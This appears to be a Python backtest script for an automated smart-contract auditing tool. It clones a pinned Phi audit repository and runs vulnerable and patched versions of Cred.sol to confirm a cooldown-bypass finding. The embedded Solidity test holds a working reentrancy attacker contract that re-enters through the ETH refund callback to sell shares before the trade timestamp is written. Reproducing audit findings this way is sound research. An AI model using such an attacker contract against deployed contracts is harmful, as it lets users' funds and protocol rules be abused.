from __future__ import annotations

import argparse
import json
import subprocess
import tempfile
from pathlib import Path

from cydra.canonical_cycle import run_canonical_differential_cycle
from cydra.finding_gate import FindingCandidate, evaluate_finding_graph
from cydra.hypotheses import Hypothesis as CanonicalHypothesis
from cydra.impact import ImpactAssessment, ImpactLevel
from cydra.pipeline import investigate
from cydra.research_loop import run_research_loop
from cydra.system_model import Edge, Node, SystemModel

TARGET_REPO = "https://github.com/code-423n4/2024-08-phi.git"
TARGET_REF = "8c0985f7a10b231f916a51af5d506dd6b0c54120"
TARGET_PATH = "src/Cred.sol"

TEST_SOURCE = r"""// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.25;

import { Settings } from "./helpers/Settings.sol";
import { Cred } from "../src/Cred.sol";
import { CuratorRewardsDistributor } from "../src/reward/CuratorRewardsDistributor.sol";
import { ECDSA } from "solady/utils/ECDSA.sol";

contract CydraCallbackStateOrderTest is Settings {
    function _createCredForTest() internal {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 expiresIn = START_TIME + 100;
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), "test", "BASIC", "SIGNATURE", bytes32(0)
        );
        bytes32 digest = ECDSA.toEthSignedMessageHash(keccak256(signCreateData));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
        if (v != 27) s = s | bytes32(uint256(1) << 255);
        uint256 price = bondingCurve.getBuyPriceAfterFee(1, 0, 1);
        cred.createCred{value: price}(participant, signCreateData, abi.encodePacked(r, s), 100, 100);
        vm.stopPrank();
    }

    function testCydraCallbackStateOrder() external {
        _createCredForTest();
        curatorRewardsDistributor.deposit{value: 1 ether}(1, 1 ether);

        CallbackAttacker attacker = new CallbackAttacker(cred, curatorRewardsDistributor);
        vm.deal(address(attacker), 10 ether);

        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 10);
        bool ok = attacker.tryBuy(buyPrice);

        assertFalse(ok, "reentrant callback bypassed the cooldown before state update");
        assertEq(cred.getShareNumber(1, address(attacker)), 0);
    }
}

contract CallbackAttacker {
    Cred immutable cred;
    CuratorRewardsDistributor immutable distributor;
    bool active = true;

    constructor(Cred cred_, CuratorRewardsDistributor distributor_) {
        cred = cred_;
        distributor = distributor_;
    }

    function tryBuy(uint256 price) external returns (bool ok) {
        (ok,) = address(cred).call{value: price + 0.01 ether}(
            abi.encodeWithSelector(Cred.buyShareCred.selector, 1, 10, 0)
        );
    }

    receive() external payable {
        if (!active) return;
        active = false;
        distributor.distribute(1);
        uint256 shares = cred.getShareNumber(1, address(this));
        if (shares > 0) {
            cred.sellShareCred(1, shares, 0);
        }
    }
}
""";

def clone_target(destination: Path) -> Path:
    subprocess.run(("git", "clone", "--no-tags", "--recurse-submodules", TARGET_REPO, str(destination)),
                   check=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    subprocess.run(("git", "-C", str(destination), "checkout", "--detach", TARGET_REF),
                   check=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    # The pinned Phi test suite imports @prb/test through node_modules. The
    # repository's bun.lockb is the authoritative dependency snapshot; install
    # it before every isolated vulnerable/patched reproduction so compilation
    # failures cannot masquerade as security observations.
    subprocess.run(("bun", "install", "--frozen-lockfile"), cwd=destination,
                   check=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    return destination

def patch_target(root: Path) -> None:
    p = root / TARGET_PATH
    source = p.read_text(encoding="utf-8")
    old = """            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }
            lastTradeTimestamp[credId_][curator_] = block.timestamp;"""
    new = """            lastTradeTimestamp[credId_][curator_] = block.timestamp;
            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }"""
    if old not in source:
        raise RuntimeError("callback-state-order patch insertion point not found")
    p.write_text(source.replace(old, new, 1), encoding="utf-8")

def run_target(root: Path, label: str, patched: bool) -> dict:
    if patched:
        patch_target(root)
    test = root / "test" / "CydraCallbackStateOrder.t.sol"
    test.write_text(TEST_SOURCE, encoding="utf-8")
    result = subprocess.run(
        ("forge", "test", "--match-test", "testCydraCallbackStateOrder", "-vvv"),
        cwd=root, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    return {
        "experiment_id": f"X-CALLBACK-STATE-ORDER-{label}",
        "executed": True,
        "tests_run": 1,
        "tests_failed": 0 if result.returncode == 0 else 1,
        "status": "PASS" if result.returncode == 0 else "FAIL",
        "exit_code": result.returncode,
        "stdout": result.stdout[-16000:],
    }

def canonical_model(h):
    model = SystemModel()
    fid = f"function:Cred:{h.target_function}"
    iid = f"invariant:{h.invariant_id}"
    hid = f"hypothesis:{h.hypothesis_id}"
    oid = "callback-before-temporal-state-update"
    model.add_node(Node("contract:Cred", "contract", "Cred", {"provenance": "pinned historical source"}))
    model.add_node(Node(fid, "function", h.target_function, {"provenance": "pinned historical source"}))
    model.add_node(Node(iid, "invariant", "Temporal/cooldown state must be established before attacker-controlled value callbacks.", {"status": "inferred", "confidence": 0.90}))
    model.add_node(Node(hid, "hypothesis", h.claim, {"belief": 0.5}))
    model.add_node(Node("observation:" + oid, "observation", "an external refund can reenter before lastTradeTimestamp is recorded", {"status": "planned", "hypothesis_id": hid, "target_function_id": fid, "binding_status": "bound", "experiment_binding": {"hypothesis_id": hid, "observation_id": "observation:" + oid, "target_function_id": fid}}))
    model.add_edge(Edge(iid, "informs", hid, {}))
    model.add_edge(Edge("observation:" + oid, "tests", hid, {}))
    return model, CanonicalHypothesis(h.hypothesis_id, h.claim, 0.5), oid

class Execution:
    def __init__(self, payload):
        self.__dict__.update(payload)

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, default=Path("backtest-artifacts/strict-blind-callback-state-order"))
    args = parser.parse_args()

    with tempfile.TemporaryDirectory(prefix="cydra-phi-v-") as tmp:
        target = clone_target(Path(tmp) / "target")
        investigation = investigate(target / TARGET_PATH, target=f"{TARGET_REPO}@{TARGET_REF}:{TARGET_PATH}")

        def execute(hypothesis, experiment):
            if hypothesis.hypothesis_id != "H-CALLBACK-STATE-ORDER-buyShareCred":
                return {"status": "UNMEASURABLE", "executed": False, "reason": "not safely renderable"}
            return run_target(target, "vulnerable", False)

        loop = run_research_loop(
            investigation.hypotheses,
            investigation.invariants,
            investigation.experiments,
            execute=execute,
            status_of=lambda x: x["status"],
            stop_when=lambda x: x.get("status") == "FAIL",
            max_rounds=10,
        )
        if not loop.rounds or loop.rounds[-1].selection.hypothesis.hypothesis_id != "H-CALLBACK-STATE-ORDER-buyShareCred":
            raise SystemExit("blind loop did not reach callback state-order hypothesis: " + ",".join(r.selection.hypothesis.hypothesis_id for r in loop.rounds))
        hypothesis = loop.rounds[-1].selection.hypothesis
        experiment = next(e for e in investigation.experiments if e.hypothesis_id == hypothesis.hypothesis_id)
        vulnerable = loop.rounds[-1].observation

    with tempfile.TemporaryDirectory(prefix="cydra-phi-p-") as tmp:
        patched = run_target(clone_target(Path(tmp) / "target"), "patched", True)
    with tempfile.TemporaryDirectory(prefix="cydra-phi-rv-") as tmp:
        independent_vulnerable = run_target(clone_target(Path(tmp) / "target"), "independent-vulnerable", False)
    with tempfile.TemporaryDirectory(prefix="cydra-phi-rp-") as tmp:
        independent_patched = run_target(clone_target(Path(tmp) / "target"), "independent-patched", True)

    model, canonical_hypothesis, observation_id = canonical_model(hypothesis)
    cycle = run_canonical_differential_cycle(
        model,
        hypothesis=canonical_hypothesis,
        observation_id=observation_id,
        vulnerable=Execution(vulnerable),
        patched=Execution(patched),
        outcome_id="strict-blind-callback-state-order-differential",
    )
    reproduction_verified = independent_vulnerable["status"] == "FAIL" and independent_patched["status"] == "PASS"
    impact = ImpactAssessment(
        ImpactLevel.MEDIUM,
        "cooldown bypass",
        "A reentrant caller can sell newly acquired shares before the target records the trade timestamp, violating the intended temporal restriction.",
        ("value refund invokes attacker-controlled code", "cooldown timestamp is written after the refund", "sellShareCred checks the timestamp"),
        cycle.causal_verification.evidence_ids,
    )
    gate = evaluate_finding_graph(
        model,
        candidate=FindingCandidate(
            True, False, True, True,
            cycle.causal_verification.state.value == "verified",
            impact.assessed, reproduction_verified
        ),
        finding_id="F-STRICT-BLIND-CALLBACK-STATE-ORDER-buyShareCred",
        hypothesis_id=f"hypothesis:{hypothesis.hypothesis_id}",
        evidence_ids=cycle.causal_verification.evidence_ids,
        causal_chain_id=cycle.causal_chain.chain_id,
    )

    payload = {
        "target": {"repo": TARGET_REPO, "ref": TARGET_REF, "path": TARGET_PATH},
        "blind_loop": [{"hypothesis": r.selection.hypothesis.__dict__, "score": r.selection.score, "status": r.status} for r in loop.rounds],
        "blind_selection": {"hypothesis": hypothesis.__dict__, "score": loop.rounds[-1].selection.score},
        "experiment": experiment.__dict__,
        "vulnerable": vulnerable,
        "patched": patched,
        "causal_verification": cycle.causal_verification.__dict__,
        "independent_vulnerable": independent_vulnerable,
        "independent_patched": independent_patched,
        "reproduction_verified": reproduction_verified,
        "finding_gate": gate.decision.value,
        "blind_boundary": "no vulnerability class, target function, exploit sequence, state surface, historical answer, or causal patch was supplied to hypothesis selection",
    }
    args.output.mkdir(parents=True, exist_ok=True)
    (args.output / "result.json").write_text(json.dumps(payload, indent=2, default=str) + "\n", encoding="utf-8")
    print(json.dumps(payload, indent=2, default=str))
    return 0 if gate.decision.value == "READY" else 1

if __name__ == "__main__":
    raise SystemExit(main())
